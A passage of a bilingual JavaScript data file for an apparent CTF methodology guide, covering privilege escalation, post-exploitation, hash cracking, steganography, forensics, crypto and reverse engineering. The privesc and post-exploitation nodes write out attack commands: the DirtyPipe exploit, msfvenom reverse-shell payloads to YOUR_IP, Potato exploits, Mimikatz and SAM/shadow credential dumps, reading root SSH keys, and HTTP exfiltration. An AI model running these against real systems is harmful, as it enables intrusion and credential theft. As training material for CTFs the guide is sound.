      { label: "DirtyPipe (CVE-2022-0847) — kernel 5.8-5.17", label_en: "DirtyPipe (CVE-2022-0847) — kernel 5.8-5.17", cmd: "gcc dirtypipe.c -o dirtypipe\n./dirtypipe /etc/passwd" }
    ],
    lookfor: ["Kernel ancien (< 4.x généralement)", "linux-exploit-suggester output"],
    lookfor_en: ["Old kernel (< 4.x generally)", "linux-exploit-suggester output"],
    tips: [
      "Exploits kernel peuvent crasher la machine — tester en dernier recours",
      "DirtyCow très fiable sur vieux kernels",
      "DirtyPipe sur kernels récents 5.8+"
    ],
    tips_en: [
      "Kernel exploits can crash the machine — test as last resort",
      "DirtyCow very reliable on old kernels",
      "DirtyPipe on recent kernels 5.8+"
    ],
    choices: [
      { label: "Root obtenu !", label_en: "Root obtained!", next: "root_obtained", icon: "👑" }
    ]
  },

  // ─── PRIVESC WINDOWS ──────────────────────────────────────────────────────

  "privesc_windows": {
    id: "privesc_windows", title: "PrivEsc Windows — Reconnaissance", title_en: "Windows PrivEsc — Enumeration", category: "privesc", icon: "🪟",
    description: "Identifier les vecteurs d'escalade sur Windows.",
    description_en: "Identify privilege escalation vectors on Windows.",
    commands: [
      { label: "WinPEAS — outil automatique", label_en: "WinPEAS — automated tool", cmd: "# Transférer winpeas.exe sur la cible\ncurl http://YOUR_IP:8000/winPEASx64.exe -o C:\\Users\\Public\\wp.exe\nC:\\Users\\Public\\wp.exe" },
      { label: "Informations système", label_en: "System information", cmd: "systeminfo\nwhoami /priv\nwhoami /groups\nnet user\nnet localgroup administrators" },
      { label: "Services vulnérables", label_en: "Vulnerable services", cmd: "wmic service get name,displayname,pathname,startmode | findstr /i 'auto' | findstr /i /v 'c:\\windows'" },
      { label: "Vérifier SeImpersonatePrivilege", label_en: "Check SeImpersonatePrivilege", cmd: "whoami /priv | findstr 'SeImpersonate SeAssignPrimary'" },
      { label: "Unquoted service paths", label_en: "Unquoted service paths", cmd: "wmic service get name,pathname | findstr /i /v 'c:\\windows\\' | findstr /i /v '\"'" }
    ],
    lookfor: [
      "SeImpersonatePrivilege ou SeAssignPrimaryTokenPrivilege → Potato exploits",
      "Unquoted service paths avec espaces",
      "Services avec permissions weak (sc sdshow)",
      "AlwaysInstallElevated (registre)"
    ],
    lookfor_en: [
      "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege → Potato exploits",
      "Unquoted service paths with spaces",
      "Services with weak permissions (sc sdshow)",
      "AlwaysInstallElevated (registry)"
    ],
    tips: [
      "whoami /priv : SeImpersonatePrivilege = ticket for SYSTEM (Juicy/Sweet/Rogue Potato)",
      "Vérifier la version Windows avec systeminfo → chercher KB patches manquants"
    ],
    tips_en: [
      "whoami /priv: SeImpersonatePrivilege = ticket to SYSTEM (Juicy/Sweet/Rogue Potato)",
      "Check Windows version with systeminfo → look for missing KB patches"
    ],
    choices: [
      { label: "SeImpersonatePrivilege activé", label_en: "SeImpersonatePrivilege enabled", next: "privesc_win_potato", icon: "🥔" },
      { label: "Unquoted service path trouvé", label_en: "Unquoted service path found", next: "privesc_win_service", icon: "⚙️" },
      { label: "AlwaysInstallElevated activé", label_en: "AlwaysInstallElevated enabled", next: "privesc_win_msi", icon: "📦" },
      { label: "Credentials Windows en mémoire ou fichiers", label_en: "Windows credentials in memory or files", next: "privesc_win_creds", icon: "🔑" },
      { label: "Déjà SYSTEM — chercher les flags", label_en: "Already SYSTEM — look for flags", next: "privesc_windows_post", icon: "👑" }
    ]
  },

  "privesc_win_potato": {
    id: "privesc_win_potato", title: "Windows — Potato Exploits (SeImpersonatePrivilege)", title_en: "Windows — Potato Exploits (SeImpersonatePrivilege)", category: "privesc", icon: "🥔",
    description: "SeImpersonatePrivilege = escalade vers SYSTEM via usurpation de token.",
    description_en: "SeImpersonatePrivilege = escalation to SYSTEM via token impersonation.",
    commands: [
      { label: "Identifier la version Windows", label_en: "Identify Windows version", cmd: "systeminfo | findstr 'OS Name'\n# Win 10/2019 → RoguePotato ou PrintSpoofer\n# Win 7/2016/2019 → JuicyPotato" },
      { label: "PrintSpoofer (recommandé, moderne)", label_en: "PrintSpoofer (recommended, modern)", cmd: "PrintSpoofer.exe -i -c cmd\nPrintSpoofer.exe -c \"cmd /c whoami\"" },
      { label: "RoguePotato", label_en: "RoguePotato", cmd: "RoguePotato.exe -r YOUR_IP -e \"cmd.exe /c whoami\" -l 9999" },
      { label: "JuicyPotato (Win 2016/2019 non patché)", label_en: "JuicyPotato (Win 2016/2019 unpatched)", cmd: "JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}" },
      { label: "GodPotato (le plus récent, Windows 2012-2022)", label_en: "GodPotato (most recent, Windows 2012-2022)", cmd: "GodPotato -cmd \"cmd /c whoami\"" }
    ],
    lookfor: ["Version Windows exacte pour choisir le bon Potato"],
    lookfor_en: ["Exact Windows version to choose the right Potato"],
    tips: [
      "PrintSpoofer fonctionne de Windows 2016 à 2022",
      "GodPotato est le plus universel récemment",
      "Si IIS ou service en NETWORK SERVICE/LOCAL SERVICE → ces exploits fonctionnent"
    ],
    tips_en: [
      "PrintSpoofer works from Windows 2016 to 2022",
      "GodPotato is the most universal recently",
      "If IIS or service running as NETWORK SERVICE/LOCAL SERVICE → these exploits work"
    ],
    choices: [
      { label: "SYSTEM obtenu !", label_en: "SYSTEM obtained!", next: "privesc_windows_post", icon: "👑" }
    ]
  },

  "privesc_win_service": {
    id: "privesc_win_service", title: "Windows — Service Vulnérable", title_en: "Windows — Vulnerable Service", category: "privesc", icon: "⚙️",
    description: "Unquoted service paths ou permissions faibles sur des services exécutés en SYSTEM.",
    description_en: "Unquoted service paths or weak permissions on services running as SYSTEM.",
    commands: [
      { label: "Unquoted path — chemin du service", label_en: "Unquoted path — service path", cmd: "# Service path : C:\\Program Files\\My App\\service.exe\n# Tenter : C:\\Program.exe (si writable)" },
      { label: "Vérifier permissions du répertoire", label_en: "Check directory permissions", cmd: "icacls \"C:\\Program Files\\My App\"" },
      { label: "Créer payload et placer", label_en: "Create payload and place it", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o Program.exe\n# Copier dans le répertoire d'unquoted path" },
      { label: "Redémarrer le service (si droits)", label_en: "Restart the service (if rights)", cmd: "sc stop SERVICE_NAME\nsc start SERVICE_NAME\n# Ou attendre redémarrage système" }
    ],
    lookfor: ["Répertoire writable dans le chemin du service", "Service qui tourne en LocalSystem"],
    lookfor_en: ["Writable directory in the service path", "Service running as LocalSystem"],
    tips: ["accesschk.exe (Sysinternals) pour vérifier les permissions détaillées"],
    tips_en: ["accesschk.exe (Sysinternals) to check detailed permissions"],
    choices: [
      { label: "SYSTEM obtenu via service !", label_en: "SYSTEM obtained via service!", next: "privesc_windows_post", icon: "👑" }
    ]
  },

  "privesc_win_msi": {
    id: "privesc_win_msi", title: "Windows — AlwaysInstallElevated", title_en: "Windows — AlwaysInstallElevated", category: "privesc", icon: "📦",
    description: "Registre configuré pour installer MSI avec droits SYSTEM.",
    description_en: "Registry configured to install MSI with SYSTEM rights.",
    commands: [
      { label: "Vérifier la config registre", label_en: "Check registry config", cmd: "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated" },
      { label: "Créer payload MSI", label_en: "Create MSI payload", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f msi -o shell.msi" },
      { label: "Exécuter l'installer", label_en: "Execute the installer", cmd: "msiexec /quiet /qn /i shell.msi" }
    ],
    lookfor: ["Les DEUX clés registre doivent être à 1"],
    lookfor_en: ["BOTH registry keys must be set to 1"],
    tips: ["Si les deux valeurs = 1 → exploitation garantie vers SYSTEM"],
    tips_en: ["If both values = 1 → guaranteed escalation to SYSTEM"],
    choices: [
      { label: "SYSTEM obtenu !", label_en: "SYSTEM obtained!", next: "privesc_windows_post", icon: "👑" }
    ]
  },

  "privesc_win_creds": {
    id: "privesc_win_creds", title: "Windows — Extraction de Credentials", title_en: "Windows — Credential Extraction", category: "privesc", icon: "🔑",
    description: "Récupérer les credentials Windows pour élever les privilèges ou se latéraliser.",
    description_en: "Retrieve Windows credentials to escalate privileges or move laterally.",
    commands: [
      { label: "Mimikatz (si SYSTEM)", label_en: "Mimikatz (if SYSTEM)", cmd: "mimikatz.exe\nprivilege::debug\nsekurlsa::logonpasswords\nlsadump::sam" },
      { label: "Dump SAM avec reg save", label_en: "Dump SAM with reg save", cmd: "reg save HKLM\\SAM sam.hive\nreg save HKLM\\SYSTEM system.hive\n# Puis transférer et analyser avec :\nimpacket-secretsdump -sam sam.hive -system system.hive LOCAL" },
      { label: "Chercher mots de passe dans fichiers", label_en: "Search passwords in files", cmd: "findstr /si 'password' *.txt *.xml *.ini *.config\nfindstr /si 'password' C:\\Users\\*" },
      { label: "Credentials Manager", label_en: "Credentials Manager", cmd: "cmdkey /list\n# Pour utiliser un credential sauvegardé :\nrunas /savecred /user:DOMAIN\\USER cmd.exe" }
    ],
    lookfor: ["Hashes NTLM → pass-the-hash ou crackage", "Mots de passe en clair dans lsass", "Credentials sauvegardés"],
    lookfor_en: ["NTLM hashes → pass-the-hash or cracking", "Cleartext passwords in lsass", "Saved credentials"],
    tips: ["Hashes NTLM : directement utilisables avec pass-the-hash sans craquer"],
    tips_en: ["NTLM hashes: directly usable with pass-the-hash without cracking"],
    choices: [
      { label: "Hashes/passwords récupérés → accès admin", label_en: "Hashes/passwords retrieved → admin access", next: "smb_authenticated", icon: "✅" },
      { label: "SYSTEM ou Administrator obtenu", label_en: "SYSTEM or Administrator obtained", next: "privesc_windows_post", icon: "👑" }
    ]
  },

  "privesc_windows_post": {
    id: "privesc_windows_post", title: "Windows SYSTEM / Admin — Post Exploitation", title_en: "Windows SYSTEM / Admin — Post Exploitation", category: "post", icon: "👑",
    description: "Privilèges maximum obtenus. Trouver les flags et persister si nécessaire.",
    description_en: "Maximum privileges obtained. Find flags and persist if necessary.",
    commands: [
      { label: "Chercher les flags", label_en: "Look for flags", cmd: "dir C:\\Users\\*\\Desktop\\*.txt /s\ntype C:\\Users\\Administrator\\Desktop\\root.txt\ntype C:\\Users\\*\\Desktop\\user.txt" },
      { label: "Dump toutes les credentials", label_en: "Dump all credentials", cmd: "mimikatz.exe\nprivilege::debug\nsekurlsa::logonpasswords\nlsadump::sam\nlsadump::secrets" },
      { label: "Exfiltrer des fichiers", label_en: "Exfiltrate files", cmd: "# Via HTTP :\npython3 -m http.server 80  # sur votre machine\nInvoke-WebRequest -Uri http://YOUR_IP/file -OutFile file" }
    ],
    lookfor: ["root.txt ou administrator.txt sur le Desktop de chaque user", "Autres machines dans le réseau (pivoting)"],
    lookfor_en: ["root.txt or administrator.txt on each user's Desktop", "Other machines in the network (pivoting)"],
    tips: ["CTF HackTheBox : user.txt dans le Desktop de l'utilisateur non-admin, root.txt dans Desktop de Administrator"],
    tips_en: ["CTF HackTheBox: user.txt on the non-admin user's Desktop, root.txt on Administrator's Desktop"],
    choices: [
      { label: "Flag trouvé — CTF terminé !", label_en: "Flag found — CTF complete!", next: "flag_found", icon: "🏁" }
    ]
  },

  // ─── POST EXPLOIT / FLAGS ─────────────────────────────────────────────────

  "root_obtained": {
    id: "root_obtained", title: "Root Linux Obtenu — Post Exploitation", title_en: "Linux Root Obtained — Post Exploitation", category: "post", icon: "👑",
    description: "UID=0. Récupérer les flags, credentials et informations utiles.",
    description_en: "UID=0. Retrieve flags, credentials and useful information.",
    commands: [
      { label: "Chercher les flags", label_en: "Look for flags", cmd: "find / -name 'root.txt' 2>/dev/null\nfind / -name 'flag.txt' 2>/dev/null\ncat /root/root.txt" },
      { label: "Dump /etc/shadow", label_en: "Dump /etc/shadow", cmd: "cat /etc/shadow\n# Cracker avec john :\nunshadow /etc/passwd /etc/shadow > unshadowed.txt\njohn unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt" },
      { label: "Clés SSH de root", label_en: "Root's SSH keys", cmd: "cat /root/.ssh/id_rsa\ncat /root/.ssh/authorized_keys" },
      { label: "Chercher d'autres machines", cmd: "cat /etc/hosts\narp -a\nip route", label_en: "Look for other machines" }
    ],
    lookfor: ["root.txt flag", "Credentials pour d'autres machines", "Informations réseau interne"],
    lookfor_en: ["root.txt flag", "Credentials for other machines", "Internal network information"],
    tips: ["Ne pas oublier le flag user.txt dans /home/user/user.txt aussi !"],
    tips_en: ["Don't forget the user.txt flag in /home/user/user.txt too!"],
    choices: [
      { label: "Flag trouvé — CTF terminé !", label_en: "Flag found — CTF complete!", next: "flag_found", icon: "🏁" },
      { label: "Autres machines identifiées → pivoting", label_en: "Other machines identified → pivoting", next: "start", icon: "🔄" }
    ]
  },

  "flag_found": {
    id: "flag_found", title: "🏁 FLAG OBTENU — Félicitations !", title_en: "🏁 FLAG OBTAINED — Congratulations!", category: "post", icon: "🏁",
    description: "Vous avez pwned la machine. Récapitulatif de la méthodologie utilisée.",
    description_en: "You have pwned the machine. Summary of the methodology used.",
    commands: [
      { label: "Écrire son writeup", label_en: "Write your writeup", cmd: "# Documenter :\n# 1. Vecteur d'entrée initial\n# 2. Chemin d'escalade\n# 3. Flags obtenus\n# 4. CVEs/techniques utilisées" }
    ],
    lookfor: [],
    tips: [
      "Écrire un writeup aide à mémoriser et consolider les techniques",
      "Partager sur HTB, THM ou votre blog pour la communauté",
      "Chercher les solutions alternatives pour apprendre d'autres approches"
    ],
    tips_en: [
      "Writing a writeup helps memorize and consolidate techniques",
      "Share on HTB, THM or your blog for the community",
      "Look for alternative solutions to learn different approaches"
    ],
    choices: [
      { label: "Recommencer une nouvelle machine", label_en: "Start a new machine", next: "start", icon: "🎯" }
    ]
  },

  // ─── PASSWORDS ────────────────────────────────────────────────────────────

  "password_crack": {
    id: "password_crack", title: "Crackage de Hashes", title_en: "Hash Cracking", category: "password", icon: "🔓",
    description: "Identifier et cracker des hashes de mots de passe.",
    description_en: "Identify and crack password hashes.",
    commands: [
      { label: "Identifier le type de hash", label_en: "Identify the hash type", cmd: "hash-identifier HASH\nhashid HASH\n# Ou : exemple de hash MD5 = 32 chars hex\n# SHA1 = 40 chars hex\n# bcrypt = $2b$..." },
      { label: "Hashcat — MD5 (mode 0)", label_en: "Hashcat — MD5 (mode 0)", cmd: "hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt" },
      { label: "Hashcat — SHA1 (mode 100)", label_en: "Hashcat — SHA1 (mode 100)", cmd: "hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt" },
      { label: "Hashcat — bcrypt (mode 3200)", label_en: "Hashcat — bcrypt (mode 3200)", cmd: "hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt" },
      { label: "Hashcat — NTLM (mode 1000)", label_en: "Hashcat — NTLM (mode 1000)", cmd: "hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt" },
      { label: "Hashcat — NTLMv2 (mode 5600)", label_en: "Hashcat — NTLMv2 (mode 5600)", cmd: "hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt" },
      { label: "John the Ripper — auto-detect", label_en: "John the Ripper — auto-detect", cmd: "john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\njohn --show hash.txt" },
      { label: "Crackstation.net — online (rapide)", label_en: "Crackstation.net — online (fast)", cmd: "# Chercher le hash sur crackstation.net ou hashes.com" },
      { label: "Règles hashcat pour mutations", label_en: "Hashcat rules for mutations", cmd: "hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule" }
    ],
    lookfor: ["Format du hash pour identifier le mode hashcat", "Salt présent ? Format : hash:salt"],
    lookfor_en: ["Hash format to identify the hashcat mode", "Salt present? Format: hash:salt"],
    tips: [
      "Modes hashcat courants : 0=MD5, 100=SHA1, 1400=SHA256, 1800=sha512crypt, 3200=bcrypt, 1000=NTLM",
      "Toujours essayer crackstation.net d'abord — instantané pour hashes courants",
      "Règles best64 multiplient les variations du wordlist"
    ],
    tips_en: [
      "Common hashcat modes: 0=MD5, 100=SHA1, 1400=SHA256, 1800=sha512crypt, 3200=bcrypt, 1000=NTLM",
      "Always try crackstation.net first — instant for common hashes",
      "best64 rules multiply wordlist variations"
    ],
    choices: [
      { label: "Hash cracké → credentials obtenus", label_en: "Hash cracked → credentials obtained", next: "credentials_found", icon: "🏆" }
    ]
  },

  // ─── CTF SPÉCIAUX ─────────────────────────────────────────────────────────

  "stego": {
    id: "stego", title: "Stéganographie", title_en: "Steganography", category: "ctf", icon: "🖼️",
    description: "Information cachée dans des images, audio ou vidéos. Courant dans les CTF.",
    description_en: "Information hidden in images, audio or videos. Common in CTFs.",
    commands: [
      { label: "Identifier le fichier", label_en: "Identify the file", cmd: "file suspicious_file\nexiftool suspicious_file" },
      { label: "Strings dans le fichier", label_en: "Strings in the file", cmd: "strings suspicious_file\nstrings suspicious_file | grep -i 'flag\\|ctf\\|password\\|key'" },
      { label: "Binwalk — chercher fichiers cachés", label_en: "Binwalk — look for hidden files", cmd: "binwalk suspicious_file\nbinwalk -e suspicious_file  # extraire" },
      { label: "Steghide — données cachées dans JPEG/BMP/WAV", label_en: "Steghide — hidden data in JPEG/BMP/WAV", cmd: "steghide info image.jpg\nsteghide extract -sf image.jpg\nsteghide extract -sf image.jpg -p PASSWORD" },
      { label: "Stegsolve — analyse de plans de bits (GUI)", label_en: "Stegsolve — bit plane analysis (GUI)", cmd: "java -jar stegsolve.jar" },
      { label: "Zsteg — PNG/BMP LSB", label_en: "Zsteg — PNG/BMP LSB", cmd: "zsteg image.png\nzsteg -a image.png  # tous les tests" },
      { label: "Outguess", label_en: "Outguess", cmd: "outguess -r image.jpg output.txt" },
      { label: "LSB sur image — decoder manuellement", label_en: "LSB on image — decode manually", cmd: "python3 -c \"\nfrom PIL import Image\nimg = Image.open('image.png')\npixels = list(img.getdata())\nbits = ''.join([str(p[0] & 1) for p in pixels])\nprint(bytes([int(bits[i:i+8],2) for i in range(0,len(bits),8)])[:100])\n\"" },
      { label: "Audio — Audacity (spectre)", label_en: "Audio — Audacity (spectrum)", cmd: "# Ouvrir dans Audacity > Changer en spectrogramme\n# Parfois le flag est visible dans les fréquences" },
      { label: "Audio — Sonic Visualiser", label_en: "Audio — Sonic Visualiser", cmd: "sonic-visualiser audio.wav\n# Ajouter 'Spectrogram' view" }
    ],
    lookfor: [
      "Exiftool : commentaires, GPS, auteur suspect",
      "Binwalk : fichiers ZIP, images, executables cachés dans l'image",
      "Steghide : données sans passphrase d'abord, puis bruteforce",
      "Différence entre taille fichier et contenu visible → données cachées"
    ],
    lookfor_en: [
      "Exiftool: comments, GPS, suspicious author",
      "Binwalk: ZIP files, images, executables hidden inside the image",
      "Steghide: try without passphrase first, then bruteforce",
      "Difference between file size and visible content → hidden data"
    ],
    tips: [
      "Essayer steghide sans passphrase d'abord",
      "Regarder les 'magic bytes' avec xxd : différent du type annoncé = fichier renommé",
      "Pour WAV/MP3 : Audacity spectrogramme cache souvent du texte",
      "PNG : zsteg est très efficace pour les CTF"
    ],
    tips_en: [
      "Try steghide without passphrase first",
      "Check magic bytes with xxd: different from announced type = renamed file",
      "For WAV/MP3: Audacity spectrogram often hides text",
      "PNG: zsteg is very effective for CTFs"
    ],
    choices: [
      { label: "Flag trouvé dans le fichier !", label_en: "Flag found in the file!", next: "flag_found", icon: "🏁" },
      { label: "Fichier caché extrait → analyser", label_en: "Hidden file extracted → analyze", next: "forensics", icon: "🔍" }
    ]
  },

  "forensics": {
    id: "forensics", title: "Forensics", title_en: "Forensics", category: "ctf", icon: "🔬",
    description: "Analyse de fichiers, mémoire, captures réseau et systèmes de fichiers.",
    description_en: "Analysis of files, memory, network captures and file systems.",
    commands: [
      { label: "Analyse de base", label_en: "Basic analysis", cmd: "file suspicious_file\nexiftool suspicious_file\nxxd suspicious_file | head -20\nstrings suspicious_file" },
      { label: "Pcap — analyse réseau", label_en: "Pcap — network analysis", cmd: "wireshark capture.pcap\ntshark -r capture.pcap -Y 'http' -T fields -e http.request.uri\nnetworkMiner capture.pcap" },
      { label: "Pcap — extraire fichiers", label_en: "Pcap — extract files", cmd: "tcpflow -r capture.pcap\nforemost -i capture.pcap -o ./output" },
      { label: "Image disque — monter", label_en: "Disk image — mount", cmd: "file disk.img\nsudo mount -o loop disk.img /mnt/disk\n# Ou avec FTK Imager / Autopsy" },
      { label: "Image mémoire — Volatility 3", label_en: "Memory image — Volatility 3", cmd: "vol -f memory.raw windows.info\nvol -f memory.raw windows.pslist\nvol -f memory.raw windows.cmdline\nvol -f memory.raw windows.dumpfiles --pid PID" },
      { label: "Volatility — Linux", label_en: "Volatility — Linux", cmd: "vol -f memory.raw linux.bash\nvol -f memory.raw linux.pslist" },
      { label: "Foremost / Scalpel — carving", label_en: "Foremost / Scalpel — carving", cmd: "foremost -i disk.img -o ./carved\nscalpel disk.img -o ./carved" }
    ],
    lookfor: [
      "Pcap : credentials HTTP en clair, FTP, Telnet",
      "Mémoire : processus suspects, lignes de commandes, chaînes de caractères",
      "Disk : fichiers supprimés récupérables, historique shell"
    ],
    lookfor_en: [
      "Pcap: cleartext HTTP credentials, FTP, Telnet",
      "Memory: suspicious processes, command lines, strings",
      "Disk: recoverable deleted files, shell history"
    ],
    tips: [
      "Wireshark : Follow TCP Stream pour reconstituer les conversations",
      "Volatility : windows.hashdump pour les hashes NTLM",
      "Strings + grep = première analyse rapide sur tous types de fichiers"
    ],
    tips_en: [
      "Wireshark: Follow TCP Stream to reconstruct conversations",
      "Volatility: windows.hashdump for NTLM hashes",
      "Strings + grep = first quick analysis on all file types"
    ],
    choices: [
      { label: "Flag trouvé !", label_en: "Flag found!", next: "flag_found", icon: "🏁" }
    ]
  },

  "crypto": {
    id: "crypto", title: "Cryptographie CTF", title_en: "CTF Cryptography", category: "ctf", icon: "🔐",
    description: "Challenges cryptographiques courants dans les CTF.",
    description_en: "Common cryptographic challenges in CTFs.",
    commands: [
      { label: "Identifier le chiffrement", label_en: "Identify the cipher", cmd: "# Longueur et caractères :\n# Base64 : A-Za-z0-9+/= (longueur multiple de 4)\n# Hex : 0-9a-f uniquement\n# ROT13/Caesar : texte lisible décalé\n# Base32 : A-Z2-7= uniquement" },
      { label: "Décoder Base64", label_en: "Decode Base64", cmd: "echo 'ENCODED' | base64 -d\npython3 -c \"import base64; print(base64.b64decode('ENCODED'))\"" },
      { label: "Décoder Hex", label_en: "Decode Hex", cmd: "echo 'HEXSTRING' | xxd -r -p\npython3 -c \"print(bytes.fromhex('HEXSTRING'))\"" },
      { label: "ROT13", label_en: "ROT13", cmd: "echo 'MESSAGE' | tr 'A-Za-z' 'N-ZA-Mn-za-m'" },
      { label: "Caesar cipher brute force", label_en: "Caesar cipher brute force", cmd: "python3 -c \"\nm='ENCODED_MESSAGE'\nfor i in range(26):\n  print(i,''.join([chr((ord(c)-65+i)%26+65) if c.isupper() else chr((ord(c)-97+i)%26+97) if c.islower() else c for c in m]))\n\"" },
      { label: "RSA — factoriser avec factordb", label_en: "RSA — factor with factordb", cmd: "# Aller sur factordb.com avec le modulo N\n# Si factorisé → calculer phi = (p-1)(q-1)\n# d = pow(e, -1, phi)\n# m = pow(c, d, N)" },
      { label: "CyberChef — tout faire en ligne", label_en: "CyberChef — do everything online", cmd: "# gchq.github.io/CyberChef — outil magique pour décoder" }
    ],
    lookfor: [
      "Longueur et charset du ciphertext → identifier l'encodage",
      "RSA avec petit N ou e=3 → vulnérabilités classiques",
      "XOR : si la clé est courte → fréquence analysis"
    ],
    lookfor_en: [
      "Length and charset of ciphertext → identify the encoding",
      "RSA with small N or e=3 → classical vulnerabilities",
      "XOR: if the key is short → frequency analysis"
    ],
    tips: [
      "CyberChef 'Magic' mode détecte automatiquement l'encodage",
      "dcode.fr : excellent pour identifier et décoder les chiffrements classiques",
      "RSA : vérifier factordb.com en premier — beaucoup de CTF utilisent des N factorisés"
    ],
    tips_en: [
      "CyberChef 'Magic' mode automatically detects the encoding",
      "dcode.fr: excellent for identifying and decoding classical ciphers",
      "RSA: check factordb.com first — many CTFs use factored N values"
    ],
    choices: [
      { label: "Flag décodé !", label_en: "Flag decoded!", next: "flag_found", icon: "🏁" }
    ]
  },

  "reverse_eng": {
    id: "reverse_eng", title: "Reverse Engineering", title_en: "Reverse Engineering", category: "ctf", icon: "⚙️",
    description: "Analyser des binaires pour comprendre leur fonctionnement et trouver le flag.",
    description_en: "Analyze binaries to understand how they work and find the flag.",
    commands: [
      { label: "Identifier le binaire", label_en: "Identify the binary", cmd: "file binary\nexiftool binary\nchecksum: md5sum binary" },
      { label: "Strings — chercher infos statiques", label_en: "Strings — look for static info", cmd: "strings binary\nstrings binary | grep -i 'flag\\|ctf\\|password\\|key\\|secret'" },
      { label: "Ltrace — appels bibliothèques", label_en: "Ltrace — library calls", cmd: "ltrace ./binary" },
      { label: "Strace — appels système", label_en: "Strace — system calls", cmd: "strace ./binary" },
      { label: "GDB — débogueur", label_en: "GDB — debugger", cmd: "gdb ./binary\n(gdb) run\n(gdb) disas main\n(gdb) break *main\n(gdb) info registers" },
      { label: "Ghidra — décompilateur (GUI)", label_en: "Ghidra — decompiler (GUI)", cmd: "ghidra\n# Importer le binaire, analyser, chercher main()" },
      { label: "Radare2 — analyse statique", label_en: "Radare2 — static analysis", cmd: "r2 ./binary\n[0x..] aaa  # analyser\n[0x..] pdf @main  # désassembler main" },
      { label: "Python — patcher une vérification", label_en: "Python — patch a check", cmd: "# Si le binaire compare un input à une chaîne statique\n# GDB : breakpoint avant la comparaison\n# Lire la valeur attendue en registre" }
    ],
    lookfor: [
      "Strings : flag ou password hardcodé",
      "Comparaison de strings dans main() → valeur attendue",
      "Anti-debug techniques : ptrace, timing checks"
    ],
    lookfor_en: [
      "Strings: hardcoded flag or password",
      "String comparison in main() → expected value",
      "Anti-debug techniques: ptrace, timing checks"
    ],
    tips: [
      "Ghidra est gratuit et très puissant — commencer par là pour les binaires complexes",
      "ltrace révèle souvent strcmp(input, 'FLAG') directement",
      "Chercher les fonctions check_password(), validate(), verify() dans Ghidra"
    ],
    tips_en: [
      "Ghidra is free and very powerful — start there for complex binaries",
      "ltrace often directly reveals strcmp(input, 'FLAG')",
      "Look for check_password(), validate(), verify() functions in Ghidra"
    ],
    choices: [
      { label: "Flag trouvé dans le binaire !", label_en: "Flag found in the binary!", next: "flag_found", icon: "🏁" }
    ]
  }
};

// Breadcrumb history
let history = [];
let currentNodeId = "start";

